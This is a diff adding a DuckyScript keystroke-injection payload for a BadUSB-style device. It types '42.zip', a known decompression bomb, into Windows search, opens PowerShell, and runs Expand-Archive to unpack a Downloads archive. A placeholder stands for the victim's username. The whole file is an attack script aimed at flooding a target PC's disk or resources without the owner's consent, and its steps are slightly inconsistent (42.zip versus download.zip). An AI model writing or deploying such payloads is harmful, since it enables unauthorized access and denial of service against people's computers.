@@ -1,0 +1,14 @@
+DELAY 2000
+GUI 
+DELAY 500
+STRING 42.zip
+DELAY 500
+ENTER
+DELAY 1000
+GUI r
+DELAY 500
+STRING Powershell
+ENTER
+DELAY 500
+STRING Expand-Archive -LiteralPath C:\Users\<REPLACE-WITH-PC-USER>\Downloads\download.zip -DestinationPath C:\Users\<REPLACE-WITH-PC-USER>\Downloads\
+REM You can get the user by saying "whoami"in the cmd
